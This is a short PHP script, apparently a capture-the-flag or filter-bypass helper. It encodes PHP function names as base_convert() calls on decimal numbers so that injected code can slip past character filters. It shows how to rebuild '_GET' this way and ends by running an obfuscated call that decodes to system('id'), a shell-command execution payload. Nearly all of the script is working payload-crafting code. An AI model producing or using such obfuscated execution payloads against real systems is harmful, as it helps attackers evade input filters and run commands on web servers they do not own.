<?php

/* 
    Only convert function with lowercase name because of `base_convert()`.
    Uppercase variables like `_GET` need to be converted to hex and dec using `bin2hex()`, `hexdec()`, `hex2bin()`, `decbin()`.
*/

function func2base_convert($text) {
    $num = base_convert($text, 36, 10);
    return "base_convert($num,10,36)";
}

function bin2base_convert($text) {
    preg_match_all('/[a-zA-Z_][a-zA-Z0-9_]*/m', $text, $funcs);
    foreach ($funcs[0] as $func) 
        $text = str_replace($func, func2base_convert($func), $text);
    return $text;
}

/* _GET */
echo bin2base_convert('hex2bin(dechex(1598506324))') . PHP_EOL;
echo base_convert(37907361743,10,36)(base_convert(810157353,10,36)(1598506324)) . PHP_EOL; 

/* system('id') */
echo bin2base_convert('system(id)') . PHP_EOL;
echo base_convert(1751504350,10,36)(base_convert(661,10,36));

?>